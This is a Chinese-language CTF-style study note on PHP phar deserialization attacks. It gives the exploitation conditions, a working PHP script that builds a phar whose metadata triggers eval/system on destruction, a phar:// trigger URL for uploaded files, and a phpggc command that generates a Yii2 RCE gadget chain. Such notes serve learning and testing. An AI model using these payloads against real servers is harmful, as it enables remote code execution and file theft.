## phar反序列化

解释：从PHP 5.3开始，引入了类似于JAR的一种打包文件机制。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句

原理：PHP文件系统函数在通过伪协议解析phar文件时，都会将 meta-data进行反序列化操作，受影响的函数如上图；所以当这些函数接收到伪协议处理到 phar 文件的时候，Meta-data 里的序列化字符串就会被反序列化，实现不使用unserialize()函数实现反序列化操作


- 利用条件
	1. phar文件(任意后缀都可以)能上传至服务器。
	2. 存在受影响函数，存在可以利用的魔术方法。

- 生成Phar注意：
	
	php.ini中将Phar.readonly设置为off

![受phar影响函数](./images/phar.png)

### phar生成代码

```
<?php
class Flag{
	public $code;
	public function __destruct(){
		eval($this->code);
	}
}
$a=new Flag();
$a->code="system('cat /ffflllaaaggg');";
$phar = new Phar("exp6.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
?>
```

上传文件引用访问触发

上传的文件后缀任意，触发phar需要用受phar影响到函数配合phar伪协议，

```
$filename = $_GET['filename'];
file_exits($filename);

?phar://upload/phar.png
```

### 白盒审计案例

https://mp.weixin.qq.com/s/2wzaXIpJgYSNnkJgRNUSEg

https://mp.weixin.qq.com/s/Z24A3LYn6P3276v7GqPw4w

## 反序列化链项目

- NotSoSecure
https://github.com/NotSoSecure/SerializedPayloadGenerator

为了利用反序列化漏洞，需要设置不同的工具，如 YSoSerial(Java)、YSoSerial.NET、PHPGGC 和它的先决条件。DeserializationHelper 是包含对 YSoSerial(Java)、YSoSerial.Net、PHPGGC 和其他工具的支持的Web界面。使用Web界面，您可以为各种框架生成反序列化payload.

Java – YSoSerial
NET – YSoSerial.NET
PHP – PHPGGC
Python - 原生

### phpggc

https://github.com/ambionics/phpggc

```
./phpggc -l #展示所有的链
./phpggc -l Thinkphp #展示Thinkphp所有的链
./phpggc Yii2/RCE1 exec(system) 'cp /fla* tt.txt' --base64 #生成YII2/RCE1利用链并base64编码 exec无回显 system有会先
													--url就是url编码
```



